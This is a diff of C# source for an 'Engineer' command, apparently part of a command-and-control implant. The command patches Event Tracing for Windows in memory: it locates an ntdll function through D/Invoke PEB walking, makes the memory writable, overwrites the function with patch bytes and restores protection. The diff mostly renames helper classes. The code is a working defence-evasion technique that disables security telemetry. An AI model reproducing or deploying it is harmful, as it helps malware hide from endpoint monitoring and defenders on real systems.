@@ -1,13 +1,10 @@
-﻿using Engineer.Extra;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
 using System.Runtime.InteropServices;
-using System.Text;
 using System.Threading.Tasks;
-using Engineer.Models;
-using Engineer.Functions;
+using DynamicEngLoading;
+
 
 namespace Engineer.Commands
 {
@@ -32,12 +29,12 @@ namespace Engineer.Commands
 
 
 
-                Tasking.FillTaskResults("ETW Patched with D/Invoke",task,EngTaskStatus.Complete,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("ETW Patched with D/Invoke",task,EngTaskStatus.Complete,TaskResponseType.String);
             }
             catch (Exception e)
             {
                 var error = "error: " + "[!] {patch failed}" + e.Message;
-                Tasking.FillTaskResults(error, task, EngTaskStatus.Failed,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(error, task, EngTaskStatus.Failed,TaskResponseType.String);
             }
         }
 
@@ -58,25 +55,24 @@ namespace Engineer.Commands
                 try
                 {
                     //get the address of the function
-                    IntPtr ModuleBase = reprobate.GetPebLdrModuleEntry("ntdll.dll");
-                    IntPtr functionAddress = reprobate.GetExportAddress(ModuleBase, module);
+                    IntPtr ModuleBase = DynInv.GetPebLdrModuleEntry("ntdll.dll");
+                    IntPtr functionAddress = DynInv.GetExportAddress(ModuleBase, module);
 
-                    //make the address writable, I wanted to use getSyscallStub but with NtAllocateVirtualMemory and NtPtotect being called fro ma ammped version of the dll, its kind of pointless to use the syscall stub.
-                    IntPtr patchLength = (IntPtr)patch.Length;
-                    uint oldProtect = h_reprobate.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref functionAddress, ref patchLength, WinAPIs.Kernel32.PAGE_READWRITE);
+                    //make the address writable, I wanted to use getSyscallStub but with NtAllocateVirtualMemory and NtPtotect being called from a maped version of the dll, its kind of pointless to use the syscall stub.
+                    uint oldProtect = h_DynInv_Methods.NtFuncWrapper.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref functionAddress, patch.Length, (uint)h_DynInv.Win32.Kernel32.MemoryProtection.ReadWrite);
 
                     // Patch function
                     Marshal.Copy(patch, 0, functionAddress, patch.Length);
-
+                    
                     // Restore memory permissions
                     uint newProtect = new uint();
-                    h_reprobate.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref functionAddress, ref patchLength, oldProtect);
+                    h_DynInv_Methods.NtFuncWrapper.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref functionAddress, patch.Length, oldProtect);
                 }
                 catch (Exception e)
                 {
 
                     //Console.WriteLine(e.Message);
-                    Tasking.FillTaskResults(e.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
+                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(e.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
                 }
                
             }
